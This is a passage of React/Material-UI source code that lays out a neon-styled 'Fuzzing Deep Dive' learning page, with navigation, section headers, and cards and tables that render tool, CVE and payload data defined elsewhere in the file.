              fontFamily: "'Fira Code', monospace",
              fontSize: "0.7rem",
            }}
          >
            [{currentIndex + 1}/{sectionNavItems.length}] MODULES LOADED
          </Typography>
        </Box>
      </Box>
      <List dense sx={{ p: 1 }}>
        {sectionNavItems.map((item, idx) => (
          <ListItem
            key={item.id}
            component="div"
            onClick={() => scrollToSection(item.id)}
            sx={{
              borderRadius: 1,
              mb: 0.5,
              cursor: "pointer",
              bgcolor: activeSection === item.id ? alpha(cyber.neonCyan, 0.15) : "transparent",
              borderLeft: `3px solid ${activeSection === item.id ? cyber.neonCyan : "transparent"}`,
              boxShadow: activeSection === item.id ? `0 0 15px ${alpha(cyber.neonCyan, 0.3)}` : "none",
              "&:hover": {
                bgcolor: alpha(cyber.neonMagenta, 0.1),
                borderLeft: `3px solid ${cyber.neonMagenta}`,
              },
              transition: "all 0.2s ease",
            }}
          >
            <ListItemIcon
              sx={{
                minWidth: 36,
                color: activeSection === item.id ? cyber.neonCyan : alpha(cyber.neonCyan, 0.5),
                filter: activeSection === item.id ? `drop-shadow(0 0 5px ${cyber.neonCyan})` : "none",
              }}
            >
              {item.icon}
            </ListItemIcon>
            <ListItemText
              primary={item.label}
              primaryTypographyProps={{
                variant: "body2",
                fontWeight: activeSection === item.id ? 700 : 400,
                color: activeSection === item.id ? cyber.neonCyan : alpha("#fff", 0.7),
                fontFamily: "'Rajdhani', sans-serif",
                letterSpacing: "0.05em",
                sx: {
                  textShadow: activeSection === item.id ? `0 0 10px ${alpha(cyber.neonCyan, 0.5)}` : "none",
                },
              }}
            />
          </ListItem>
        ))}
      </List>
    </Paper>
  );

  // Mobile Navigation Drawer
  const mobileDrawer = (
    <Drawer
      anchor="right"
      open={navDrawerOpen}
      onClose={() => setNavDrawerOpen(false)}
      PaperProps={{
        sx: {
          width: 300,
          bgcolor: cyber.darkPanel,
          borderLeft: `2px solid ${cyber.neonCyan}`,
          boxShadow: `-10px 0 40px ${alpha(cyber.neonCyan, 0.3)}`,
        },
      }}
    >
      <Box
        sx={{
          p: 2,
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          borderBottom: `1px solid ${alpha(cyber.neonCyan, 0.3)}`,
          background: `linear-gradient(180deg, ${alpha(cyber.neonCyan, 0.1)}, transparent)`,
        }}
      >
        <Typography
          variant="h6"
          sx={{
            fontWeight: 700,
            color: cyber.neonCyan,
            fontFamily: "'Orbitron', sans-serif",
            textShadow: `0 0 15px ${cyber.neonCyan}`,
            letterSpacing: "0.1em",
          }}
        >
          NAVIGATION
        </Typography>
        <IconButton
          onClick={() => setNavDrawerOpen(false)}
          sx={{
            color: cyber.neonPink,
            border: `1px solid ${cyber.neonPink}`,
            "&:hover": { bgcolor: alpha(cyber.neonPink, 0.2) },
          }}
        >
          <CloseIcon />
        </IconButton>
      </Box>
      <Box sx={{ p: 2 }}>
        <LinearProgress
          variant="determinate"
          value={progressPercent}
          sx={{
            height: 8,
            borderRadius: 1,
            bgcolor: alpha(cyber.neonCyan, 0.1),
            "& .MuiLinearProgress-bar": {
              bgcolor: cyber.neonCyan,
              boxShadow: `0 0 10px ${cyber.neonCyan}`,
            },
          }}
        />
      </Box>
      <List sx={{ px: 1 }}>
        {sectionNavItems.map((item) => (
          <ListItem
            key={item.id}
            component="div"
            onClick={() => scrollToSection(item.id)}
            sx={{
              borderRadius: 1,
              mb: 0.5,
              cursor: "pointer",
              bgcolor: activeSection === item.id ? alpha(cyber.neonCyan, 0.15) : "transparent",
              borderLeft: `3px solid ${activeSection === item.id ? cyber.neonCyan : "transparent"}`,
              "&:hover": { bgcolor: alpha(cyber.neonMagenta, 0.1) },
            }}
          >
            <ListItemIcon sx={{ minWidth: 40, color: activeSection === item.id ? cyber.neonCyan : alpha("#fff", 0.5) }}>
              {item.icon}
            </ListItemIcon>
            <ListItemText
              primary={item.label}
              primaryTypographyProps={{
                fontWeight: activeSection === item.id ? 700 : 400,
                color: activeSection === item.id ? cyber.neonCyan : alpha("#fff", 0.8),
              }}
            />
          </ListItem>
        ))}
      </List>
    </Drawer>
  );

  return (
    <LearnPageLayout pageTitle="Fuzzing Deep Dive" pageContext={pageContext}>
      {/* Cyberpunk Background Grid */}
      <Box
        sx={{
          position: "fixed",
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          pointerEvents: "none",
          zIndex: 0,
          background: `
            linear-gradient(${alpha(cyber.neonCyan, 0.03)} 1px, transparent 1px),
            linear-gradient(90deg, ${alpha(cyber.neonCyan, 0.03)} 1px, transparent 1px)
          `,
          backgroundSize: "50px 50px",
          "&::after": {
            content: '""',
            position: "absolute",
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            background: `radial-gradient(ellipse at 50% 0%, ${alpha(cyber.neonCyan, 0.1)} 0%, transparent 50%)`,
          },
        }}
      />

      {/* Scan Line Effect */}
      <Box
        sx={{
          position: "fixed",
          top: 0,
          left: 0,
          right: 0,
          height: "4px",
          background: `linear-gradient(90deg, transparent, ${cyber.neonCyan}, transparent)`,
          opacity: 0.5,
          animation: `${scanLine} 8s linear infinite`,
          pointerEvents: "none",
          zIndex: 1000,
        }}
      />

      <Box sx={{ display: "flex", gap: 3, maxWidth: 1400, mx: "auto", px: { xs: 2, md: 3 }, py: 4, position: "relative", zIndex: 1 }}>
        {/* Sidebar - Desktop only */}
        {!isMobile && sidebarNav}

        {/* Main Content */}
        <Box sx={{ flex: 1, minWidth: 0 }}>
          {/* Back Button */}
          <Chip
            component={Link}
            to="/learn"
            icon={<ArrowBackIcon />}
            label="< RETURN TO HUB"
            clickable
            variant="outlined"
            sx={{
              borderRadius: 1,
              mb: 3,
              borderColor: cyber.neonMagenta,
              color: cyber.neonMagenta,
              fontFamily: "'Orbitron', sans-serif",
              fontWeight: 600,
              letterSpacing: "0.1em",
              "&:hover": {
                bgcolor: alpha(cyber.neonMagenta, 0.1),
                boxShadow: `0 0 20px ${alpha(cyber.neonMagenta, 0.5)}`,
              },
            }}
          />

          {/* Hero Section */}
          <Paper
            id="intro"
            sx={{
              p: 4,
              mb: 4,
              borderRadius: 2,
              background: `linear-gradient(135deg, ${alpha(cyber.darkCard, 0.95)}, ${alpha(cyber.darkBg, 0.98)})`,
              border: `2px solid ${cyber.neonCyan}`,
              boxShadow: `0 0 40px ${alpha(cyber.neonCyan, 0.3)}, inset 0 0 60px ${alpha(cyber.neonCyan, 0.05)}`,
              scrollMarginTop: "80px",
              position: "relative",
              overflow: "hidden",
              "&::before": {
                content: '""',
                position: "absolute",
                top: 0,
                left: 0,
                right: 0,
                height: "3px",
                background: `linear-gradient(90deg, ${cyber.neonCyan}, ${cyber.neonMagenta}, ${cyber.neonPink}, ${cyber.neonCyan})`,
                backgroundSize: "300% 100%",
                animation: `${gradientShift} 5s ease infinite`,
              },
              "&::after": {
                content: '"SYSTEM_ACTIVE"',
                position: "absolute",
                top: 16,
                right: 16,
                fontSize: "0.65rem",
                color: cyber.neonGreen,
                fontFamily: "'Fira Code', monospace",
                animation: `${neonFlicker} 3s infinite`,
              },
            }}
          >
            <Box sx={{ display: "flex", alignItems: "center", gap: 3, mb: 4 }}>
              <Box
                sx={{
                  width: 80,
                  height: 80,
                  borderRadius: 2,
                  border: `2px solid ${cyber.neonCyan}`,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  bgcolor: alpha(cyber.neonCyan, 0.1),
                  boxShadow: `0 0 30px ${alpha(cyber.neonCyan, 0.4)}, inset 0 0 20px ${alpha(cyber.neonCyan, 0.2)}`,
                  animation: `${glowPulse} 2s ease-in-out infinite`,
                  color: cyber.neonCyan,
                }}
              >
                <BugReportIcon sx={{ fontSize: 40 }} />
              </Box>
              <Box>
                <Typography
                  variant="h2"
                  sx={{
                    fontWeight: 900,
                    mb: 0.5,
                    fontFamily: "'Orbitron', 'Rajdhani', sans-serif",
                    letterSpacing: "0.05em",
                    background: `linear-gradient(135deg, ${cyber.neonCyan}, ${cyber.neonMagenta})`,
                    WebkitBackgroundClip: "text",
                    WebkitTextFillColor: "transparent",
                    textShadow: `0 0 40px ${alpha(cyber.neonCyan, 0.5)}`,
                    animation: `${textGlitch} 5s ease-in-out infinite`,
                  }}
                >
                  FUZZING DEEP DIVE
                </Typography>
                <Typography
                  variant="h6"
                  sx={{
                    color: alpha(cyber.neonMagenta, 0.8),
                    fontFamily: "'Rajdhani', sans-serif",
                    letterSpacing: "0.15em",
                    fontWeight: 500,
                  }}
                >
                  // AUTOMATED BUG HUNTING PROTOCOL
                </Typography>
              </Box>
            </Box>

            {/* Quick Stats */}
            <Box
              sx={{
                display: "flex",
                flexWrap: "wrap",
                gap: 2,
                justifyContent: "center",
                p: 3,
                borderRadius: 2,
                bgcolor: alpha(cyber.darkBg, 0.6),
                border: `1px solid ${alpha(cyber.neonCyan, 0.3)}`,
              }}
            >
              {[
                { value: "16+", label: "TOOLS", color: cyber.neonCyan },
                { value: "12", label: "MUTATIONS", color: cyber.neonMagenta },
                { value: "108", label: "QUESTIONS", color: cyber.neonPink },
                { value: "6", label: "CVEs", color: cyber.neonYellow },
                { value: "50+", label: "TECHNIQUES", color: cyber.neonGreen },
              ].map((stat, i) => (
                <Box
                  key={i}
                  sx={{
                    textAlign: "center",
                    px: 3,
                    py: 2,
                    border: `1px solid ${alpha(stat.color, 0.5)}`,
                    borderRadius: 1,
                    bgcolor: alpha(stat.color, 0.05),
                    boxShadow: `0 0 15px ${alpha(stat.color, 0.2)}`,
                    transition: "all 0.3s ease",
                    "&:hover": {
                      transform: "translateY(-2px)",
                      boxShadow: `0 0 25px ${alpha(stat.color, 0.4)}`,
                    },
                  }}
                >
                  <Typography
                    variant="h4"
                    sx={{
                      fontWeight: 900,
                      color: stat.color,
                      fontFamily: "'Orbitron', sans-serif",
                      textShadow: `0 0 20px ${stat.color}`,
                    }}
                  >
                    {stat.value}
                  </Typography>
                  <Typography
                    variant="caption"
                    sx={{
                      color: alpha(stat.color, 0.8),
                      fontFamily: "'Fira Code', monospace",
                      letterSpacing: "0.15em",
                      fontSize: "0.65rem",
                    }}
                  >
                    {stat.label}
                  </Typography>
                </Box>
              ))}
            </Box>
          </Paper>

          {/* Quick Navigation Chips */}
          <Paper
            sx={{
              p: 2,
              mb: 4,
              borderRadius: 2,
              position: "sticky",
              top: 64,
              zIndex: 10,
              bgcolor: alpha(cyber.darkPanel, 0.98),
              backdropFilter: "blur(20px)",
              border: `1px solid ${alpha(cyber.neonCyan, 0.3)}`,
              boxShadow: `0 5px 30px ${alpha(cyber.darkBg, 0.8)}`,
            }}
          >
            <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap", justifyContent: "center" }}>
              {sectionNavItems.map((nav) => (
                <Chip
                  key={nav.id}
                  label={nav.label}
                  size="small"
                  onClick={() => scrollToSection(nav.id)}
                  sx={{
                    fontWeight: 600,
                    fontFamily: "'Rajdhani', sans-serif",
                    letterSpacing: "0.05em",
                    bgcolor: activeSection === nav.id ? alpha(cyber.neonCyan, 0.2) : "transparent",
                    border: `1px solid ${activeSection === nav.id ? cyber.neonCyan : alpha(cyber.neonCyan, 0.3)}`,
                    color: activeSection === nav.id ? cyber.neonCyan : alpha("#fff", 0.7),
                    boxShadow: activeSection === nav.id ? `0 0 15px ${alpha(cyber.neonCyan, 0.4)}` : "none",
                    "&:hover": {
                      bgcolor: alpha(cyber.neonMagenta, 0.15),
                      borderColor: cyber.neonMagenta,
                      boxShadow: `0 0 15px ${alpha(cyber.neonMagenta, 0.4)}`,
                    },
                    transition: "all 0.2s ease",
                  }}
                />
              ))}
            </Box>
          </Paper>

          {/* Section: Fundamentals */}
          <Box id="fundamentals" sx={{ mb: 6, scrollMarginTop: "140px" }}>
            <Typography
              variant="h4"
              sx={{
                fontWeight: 800,
                mb: 3,
                display: "flex",
                alignItems: "center",
                gap: 2,
                fontFamily: "'Orbitron', sans-serif",
                color: cyber.neonCyan,
                textShadow: `0 0 20px ${alpha(cyber.neonCyan, 0.5)}`,
                letterSpacing: "0.05em",
              }}
            >
              <BugReportIcon sx={{ filter: `drop-shadow(0 0 10px ${cyber.neonCyan})` }} />
              FUZZING FUNDAMENTALS
            </Typography>
            {fundamentalsSections.map((section, i) => (
              <SectionAccordion key={i} section={section} index={i} />
            ))}
          </Box>

          {/* Section: Setup & Harnesses */}
          <Box id="setup" sx={{ mb: 6, scrollMarginTop: "140px" }}>
            <Typography
              variant="h4"
              sx={{
                fontWeight: 800,
                mb: 3,
                display: "flex",
                alignItems: "center",
                gap: 2,
                fontFamily: "'Orbitron', sans-serif",
                color: cyber.neonMagenta,
                textShadow: `0 0 20px ${alpha(cyber.neonMagenta, 0.5)}`,
              }}
            >
              <SettingsIcon sx={{ filter: `drop-shadow(0 0 10px ${cyber.neonMagenta})` }} />
              SETUP & HARNESSES
            </Typography>
            {setupSections.map((section, i) => (
              <SectionAccordion key={i} section={section} index={i} />
            ))}
          </Box>

          {/* Section: Advanced Techniques */}
          <Box id="advanced" sx={{ mb: 6, scrollMarginTop: "140px" }}>
            <Typography
              variant="h4"
              sx={{
                fontWeight: 800,
                mb: 3,
                display: "flex",
                alignItems: "center",
                gap: 2,
                fontFamily: "'Orbitron', sans-serif",
                color: cyber.neonPink,
                textShadow: `0 0 20px ${alpha(cyber.neonPink, 0.5)}`,
              }}
            >
              <SpeedIcon sx={{ filter: `drop-shadow(0 0 10px ${cyber.neonPink})` }} />
              ADVANCED TECHNIQUES
            </Typography>
            {advancedSections.map((section, i) => (
              <SectionAccordion key={i} section={section} index={i} />
            ))}
          </Box>

          {/* Section: Web Fuzzing */}
          <Box id="web-fuzzing" sx={{ mb: 6, scrollMarginTop: "140px" }}>
            <Typography
              variant="h4"
              sx={{
                fontWeight: 800,
                mb: 3,
                display: "flex",
                alignItems: "center",
                gap: 2,
                fontFamily: "'Orbitron', sans-serif",
                color: cyber.neonPurple,
                textShadow: `0 0 20px ${alpha(cyber.neonPurple, 0.5)}`,
              }}
            >
              <WebIcon sx={{ filter: `drop-shadow(0 0 10px ${cyber.neonPurple})` }} />
              WEB APPLICATION FUZZING
            </Typography>
            {webFuzzingSections.map((section, i) => (
              <SectionAccordion key={i} section={section} index={i} />
            ))}
          </Box>

          {/* Section: Kernel Fuzzing */}
          <Box id="kernel-fuzzing" sx={{ mb: 6, scrollMarginTop: "140px" }}>
            <Typography
              variant="h4"
              sx={{
                fontWeight: 800,
                mb: 3,
                display: "flex",
                alignItems: "center",
                gap: 2,
                fontFamily: "'Orbitron', sans-serif",
                color: "#ff6b35",
                textShadow: `0 0 20px ${alpha("#ff6b35", 0.5)}`,
              }}
            >
              <MemoryIcon sx={{ filter: `drop-shadow(0 0 10px #ff6b35)` }} />
              KERNEL & SYSTEM FUZZING
            </Typography>
            {kernelFuzzingSections.map((section, i) => (
              <SectionAccordion key={i} section={section} index={i} />
            ))}
          </Box>

          {/* Section: Smart Contract Fuzzing */}
          <Box id="smart-contracts" sx={{ mb: 6, scrollMarginTop: "140px" }}>
            <Typography
              variant="h4"
              sx={{
                fontWeight: 800,
                mb: 3,
                display: "flex",
                alignItems: "center",
                gap: 2,
                fontFamily: "'Orbitron', sans-serif",
                color: "#00d4aa",
                textShadow: `0 0 20px ${alpha("#00d4aa", 0.5)}`,
              }}
            >
              <SecurityIcon sx={{ filter: `drop-shadow(0 0 10px #00d4aa)` }} />
              SMART CONTRACT FUZZING
            </Typography>
            {smartContractSections.map((section, i) => (
              <SectionAccordion key={i} section={section} index={i} />
            ))}
          </Box>

          {/* Section: Coverage Analysis */}
          <Box id="coverage" sx={{ mb: 6, scrollMarginTop: "140px" }}>
            <Typography
              variant="h4"
              sx={{
                fontWeight: 800,
                mb: 3,
                display: "flex",
                alignItems: "center",
                gap: 2,
                fontFamily: "'Orbitron', sans-serif",
                color: "#7c3aed",
                textShadow: `0 0 20px ${alpha("#7c3aed", 0.5)}`,
              }}
            >
              <DataObjectIcon sx={{ filter: `drop-shadow(0 0 10px #7c3aed)` }} />
              COVERAGE ANALYSIS
            </Typography>
            {coverageAnalysisSections.map((section, i) => (
              <SectionAccordion key={i} section={section} index={i} />
            ))}
          </Box>

          {/* Section: CVE Case Studies */}
          <Box id="cve-studies" sx={{ mb: 6, scrollMarginTop: "140px" }}>
            <Typography
              variant="h4"
              sx={{
                fontWeight: 800,
                mb: 3,
                display: "flex",
                alignItems: "center",
                gap: 2,
                fontFamily: "'Orbitron', sans-serif",
                color: "#ef4444",
                textShadow: `0 0 20px ${alpha("#ef4444", 0.5)}`,
              }}
            >
              <WarningAmberIcon sx={{ filter: `drop-shadow(0 0 10px #ef4444)` }} />
              REAL-WORLD CVE CASE STUDIES
            </Typography>
            <Grid container spacing={3}>
              {cveStudies.map((cve, i) => (
                <Grid item xs={12} key={i}>
                  <Paper
                    sx={{
                      p: 3,
                      borderRadius: 2,
                      bgcolor: alpha(cyber.darkCard, 0.9),
                      border: `1px solid ${alpha("#ef4444", 0.3)}`,
                      transition: "all 0.3s ease",
                      position: "relative",
                      overflow: "hidden",
                      "&:hover": {
                        borderColor: "#ef4444",
                        boxShadow: `0 0 30px ${alpha("#ef4444", 0.3)}`,
                      },
                      "&::before": {
                        content: '""',
                        position: "absolute",
                        top: 0,
                        left: 0,
                        width: "4px",
                        height: "100%",
                        background: `linear-gradient(180deg, #ef4444, ${cyber.neonMagenta})`,
                      },
                    }}
                  >
                    <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2, flexWrap: "wrap" }}>
                      <Typography
                        variant="h6"
                        sx={{
                          fontWeight: 700,
                          color: "#ef4444",
                          fontFamily: "'Orbitron', sans-serif",
                          fontSize: "1rem",
                        }}
                      >
                        {cve.cve}
                      </Typography>
                      <Chip
                        label={cve.severity}
                        size="small"
                        sx={{
                          bgcolor: alpha("#ef4444", 0.2),
                          color: "#ef4444",
                          border: `1px solid #ef4444`,
                          fontFamily: "'Fira Code', monospace",
                          fontSize: "0.65rem",
                          fontWeight: 700,
                        }}
                      />
                      <Chip
                        label={cve.target}
                        size="small"
                        sx={{
                          bgcolor: alpha(cyber.neonCyan, 0.1),
                          color: cyber.neonCyan,
                          border: `1px solid ${alpha(cyber.neonCyan, 0.5)}`,
                          fontFamily: "'Fira Code', monospace",
                          fontSize: "0.65rem",
                        }}
                      />
                    </Box>
                    <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7, color: alpha("#fff", 0.8) }}>
                      {cve.description}
                    </Typography>
                    <Paper
                      sx={{
                        p: 2,
                        mb: 2,
                        bgcolor: alpha(cyber.neonGreen, 0.05),
                        border: `1px solid ${alpha(cyber.neonGreen, 0.3)}`,
                        borderRadius: 1,
                      }}
                    >
                      <Typography
                        variant="caption"
                        sx={{ fontWeight: 700, color: cyber.neonGreen, fontFamily: "'Fira Code', monospace" }}
                      >
                        // FUZZING LESSON:
                      </Typography>
                      <Typography variant="body2" sx={{ color: alpha("#fff", 0.9), mt: 0.5 }}>
                        {cve.fuzzingLesson}
                      </Typography>
                    </Paper>
                    <CodeBlock code={cve.code} id={`cve-${i}`} />
                    <Box sx={{ mt: 2, display: "flex", alignItems: "center", gap: 1 }}>
                      <Typography variant="caption" sx={{ color: cyber.neonMagenta, fontFamily: "'Fira Code', monospace" }}>
                        IMPACT:
                      </Typography>
                      <Typography variant="caption" sx={{ color: alpha("#fff", 0.7) }}>
                        {cve.impact}
                      </Typography>
                    </Box>
                  </Paper>
                </Grid>
              ))}
            </Grid>
          </Box>

          {/* Section: Tools Reference */}
          <Box id="tools" sx={{ mb: 6, scrollMarginTop: "140px" }}>
            <Typography
              variant="h4"
              sx={{
                fontWeight: 800,
                mb: 3,
                display: "flex",
                alignItems: "center",
                gap: 2,
                fontFamily: "'Orbitron', sans-serif",
                color: cyber.neonGreen,
                textShadow: `0 0 20px ${alpha(cyber.neonGreen, 0.5)}`,
              }}
            >
              <BuildIcon sx={{ filter: `drop-shadow(0 0 10px ${cyber.neonGreen})` }} />
              TOOLS DATABASE
            </Typography>
            <Grid container spacing={3}>
              {[...fuzzingTools, ...additionalFuzzingTools].map((tool, i) => (
                <Grid item xs={12} md={6} key={i}>
                  <Paper
                    sx={{
                      p: 3,
                      height: "100%",
                      borderRadius: 2,
                      bgcolor: alpha(cyber.darkCard, 0.9),
                      border: `1px solid ${alpha(cyber.neonCyan, 0.3)}`,
                      transition: "all 0.3s ease",
                      position: "relative",
                      overflow: "hidden",
                      "&:hover": {
                        borderColor: cyber.neonCyan,
                        boxShadow: `0 0 30px ${alpha(cyber.neonCyan, 0.3)}`,
                        transform: "translateY(-4px)",
                      },
                      "&::before": {
                        content: '""',
                        position: "absolute",
                        top: 0,
                        left: 0,
                        width: "100%",
                        height: "2px",
                        background: `linear-gradient(90deg, transparent, ${cyber.neonCyan}, transparent)`,
                      },
                    }}
                  >
                    <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 2 }}>
                      <Typography
                        variant="h6"
                        sx={{
                          fontWeight: 700,
                          color: cyber.neonCyan,
                          fontFamily: "'Orbitron', sans-serif",
                          fontSize: "1rem",
                        }}
                      >
                        {tool.name}
                      </Typography>
                      <Chip
                        label={tool.target}
                        size="small"
                        sx={{
                          bgcolor: alpha(cyber.neonMagenta, 0.2),
                          color: cyber.neonMagenta,
                          border: `1px solid ${cyber.neonMagenta}`,
                          fontFamily: "'Fira Code', monospace",
                          fontSize: "0.65rem",
                        }}
                      />
                    </Box>
                    <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7, color: alpha("#fff", 0.7) }}>
                      {tool.description}
                    </Typography>
                    <CodeBlock code={tool.installCmd} id={`tool-install-${i}`} />
                    <Typography
                      variant="caption"
                      sx={{
                        display: "block",
                        mt: 2,
                        mb: 1,
                        fontWeight: 600,
                        color: cyber.neonGreen,
                        fontFamily: "'Fira Code', monospace",
                      }}
                    >
                      // USAGE EXAMPLE:
                    </Typography>
                    <CodeBlock code={tool.exampleCmd} id={`tool-example-${i}`} />
                    <Box sx={{ mt: 2, display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                      {tool.bestFor.map((tag) => (
                        <Chip
                          key={tag}
                          label={tag}
                          size="small"
                          sx={{
                            fontSize: "0.65rem",
                            bgcolor: alpha(cyber.neonPurple, 0.1),
                            color: cyber.neonPurple,
                            border: `1px solid ${alpha(cyber.neonPurple, 0.3)}`,
                          }}
                        />
                      ))}
                    </Box>
                  </Paper>
                </Grid>
              ))}
            </Grid>
          </Box>

          {/* Section: Mutation Strategies */}
          <Box id="mutations" sx={{ mb: 6, scrollMarginTop: "140px" }}>
            <Typography
              variant="h4"
              sx={{
                fontWeight: 800,
                mb: 3,
                display: "flex",
                alignItems: "center",
                gap: 2,
                fontFamily: "'Orbitron', sans-serif",
                color: cyber.neonYellow,
                textShadow: `0 0 20px ${alpha(cyber.neonYellow, 0.5)}`,
              }}
            >
              <AutoFixHighIcon sx={{ filter: `drop-shadow(0 0 10px ${cyber.neonYellow})` }} />
              MUTATION STRATEGIES
            </Typography>
            <Grid container spacing={3}>
              {[...mutationStrategies, ...additionalMutations].map((strategy, i) => (
                <Grid item xs={12} md={6} key={i}>
                  <Paper
                    sx={{
                      p: 3,
                      height: "100%",
                      borderRadius: 2,
                      bgcolor: alpha(cyber.darkCard, 0.9),
                      border: `1px solid ${alpha(cyber.neonYellow, 0.3)}`,
                      "&:hover": {
                        borderColor: cyber.neonYellow,
                        boxShadow: `0 0 20px ${alpha(cyber.neonYellow, 0.3)}`,
                      },
                    }}
                  >
                    <Typography
                      variant="h6"
                      sx={{
                        fontWeight: 700,
                        mb: 1,
                        color: cyber.neonYellow,
                        fontFamily: "'Orbitron', sans-serif",
                        fontSize: "1rem",
                      }}
                    >
                      {strategy.name}
                    </Typography>
                    <Typography variant="body2" sx={{ mb: 2, color: alpha("#fff", 0.7) }}>
                      {strategy.description}
                    </Typography>
                    <Paper
                      sx={{
                        p: 1.5,
                        bgcolor: alpha(cyber.darkBg, 0.9),
                        borderRadius: 1,
                        mb: 2,
                        border: `1px solid ${alpha(cyber.neonGreen, 0.3)}`,
                      }}
                    >
                      <Typography
                        variant="body2"
                        sx={{
                          fontFamily: "'Fira Code', monospace",
                          color: cyber.neonGreen,
                          fontSize: "0.8rem",
                        }}
                      >
                        {strategy.example}
                      </Typography>
                    </Paper>
                    <Typography
                      variant="caption"
                      sx={{
                        fontWeight: 600,
                        display: "block",
                        mb: 1,
                        color: cyber.neonMagenta,
                        fontFamily: "'Fira Code', monospace",
                      }}
                    >
                      // DETECTS:
                    </Typography>
                    <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                      {strategy.finds.map((f) => (
                        <Chip
                          key={f}
                          label={f}
                          size="small"
                          sx={{
                            fontSize: "0.65rem",
                            bgcolor: alpha(cyber.neonPink, 0.1),
                            color: cyber.neonPink,
                            border: `1px solid ${alpha(cyber.neonPink, 0.3)}`,
                          }}
                        />
                      ))}
                    </Box>
                  </Paper>
                </Grid>
              ))}
            </Grid>
          </Box>

          {/* Section: Magic Values */}
          <Box id="magic-values" sx={{ mb: 6, scrollMarginTop: "140px" }}>
            <Typography
              variant="h4"
              sx={{
                fontWeight: 800,
                mb: 3,
                display: "flex",
                alignItems: "center",
                gap: 2,
                fontFamily: "'Orbitron', sans-serif",
                color: cyber.neonCyan,
                textShadow: `0 0 20px ${alpha(cyber.neonCyan, 0.5)}`,
              }}
            >
              <DataObjectIcon sx={{ filter: `drop-shadow(0 0 10px ${cyber.neonCyan})` }} />
              MAGIC VALUES DATABASE
            </Typography>

            {/* Integers */}
            <Paper
              sx={{
                p: 3,
                borderRadius: 2,
                mb: 3,
                bgcolor: alpha(cyber.darkCard, 0.9),
                border: `1px solid ${alpha(cyber.neonCyan, 0.3)}`,
              }}
            >
              <Typography
                variant="h6"
                sx={{
                  fontWeight: 700,
                  mb: 2,
                  display: "flex",
                  alignItems: "center",
                  gap: 1,
                  color: cyber.neonCyan,
                  fontFamily: "'Orbitron', sans-serif",
                }}
              >
                <CodeIcon /> INTEGER_VALUES
              </Typography>
              <TableContainer>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ fontWeight: 700, color: cyber.neonCyan, borderColor: alpha(cyber.neonCyan, 0.3), fontFamily: "'Fira Code', monospace" }}>
                        VALUE
                      </TableCell>
                      <TableCell sx={{ fontWeight: 700, color: cyber.neonCyan, borderColor: alpha(cyber.neonCyan, 0.3), fontFamily: "'Fira Code', monospace" }}>
                        REASON
                      </TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {interestingPayloads.integers.map((p, i) => (
                      <TableRow key={i} sx={{ "&:hover": { bgcolor: alpha(cyber.neonCyan, 0.05) } }}>
                        <TableCell sx={{ fontFamily: "'Fira Code', monospace", color: cyber.neonGreen, borderColor: alpha(cyber.neonCyan, 0.2) }}>
                          {p.value}
                        </TableCell>
                        <TableCell sx={{ color: alpha("#fff", 0.8), borderColor: alpha(cyber.neonCyan, 0.2) }}>{p.reason}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </Paper>

            {/* Strings */}
            <Paper
              sx={{
                p: 3,
                borderRadius: 2,
                mb: 3,
                bgcolor: alpha(cyber.darkCard, 0.9),
                border: `1px solid ${alpha(cyber.neonMagenta, 0.3)}`,
              }}
            >
              <Typography
                variant="h6"
                sx={{
                  fontWeight: 700,
                  mb: 2,
                  display: "flex",
                  alignItems: "center",
                  gap: 1,
                  color: cyber.neonMagenta,
                  fontFamily: "'Orbitron', sans-serif",
                }}
              >
                <TerminalIcon /> STRING_VALUES
              </Typography>
              <TableContainer>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ fontWeight: 700, color: cyber.neonMagenta, borderColor: alpha(cyber.neonMagenta, 0.3), fontFamily: "'Fira Code', monospace" }}>
                        VALUE
                      </TableCell>
                      <TableCell sx={{ fontWeight: 700, color: cyber.neonMagenta, borderColor: alpha(cyber.neonMagenta, 0.3), fontFamily: "'Fira Code', monospace" }}>
                        REASON
                      </TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {interestingPayloads.strings.map((p, i) => (
                      <TableRow key={i} sx={{ "&:hover": { bgcolor: alpha(cyber.neonMagenta, 0.05) } }}>
                        <TableCell sx={{ fontFamily: "'Fira Code', monospace", color: cyber.neonPink, borderColor: alpha(cyber.neonMagenta, 0.2) }}>
                          {p.value}
                        </TableCell>
                        <TableCell sx={{ color: alpha("#fff", 0.8), borderColor: alpha(cyber.neonMagenta, 0.2) }}>{p.reason}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </Paper>

            {/* File Formats */}
            <Paper
              sx={{
                p: 3,
                borderRadius: 2,
                bgcolor: alpha(cyber.darkCard, 0.9),
                border: `1px solid ${alpha(cyber.neonPurple, 0.3)}`,
              }}
            >
              <Typography
                variant="h6"
                sx={{
                  fontWeight: 700,
                  mb: 2,
                  display: "flex",
                  alignItems: "center",
                  gap: 1,
                  color: cyber.neonPurple,
                  fontFamily: "'Orbitron', sans-serif",
                }}
              >
                <StorageIcon /> FORMAT_ANOMALIES
              </Typography>
              <TableContainer>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ fontWeight: 700, color: cyber.neonPurple, borderColor: alpha(cyber.neonPurple, 0.3), fontFamily: "'Fira Code', monospace" }}>
                        ANOMALY
                      </TableCell>
                      <TableCell sx={{ fontWeight: 700, color: cyber.neonPurple, borderColor: alpha(cyber.neonPurple, 0.3), fontFamily: "'Fira Code', monospace" }}>
                        REASON
                      </TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {interestingPayloads.formats.map((p, i) => (
                      <TableRow key={i} sx={{ "&:hover": { bgcolor: alpha(cyber.neonPurple, 0.05) } }}>
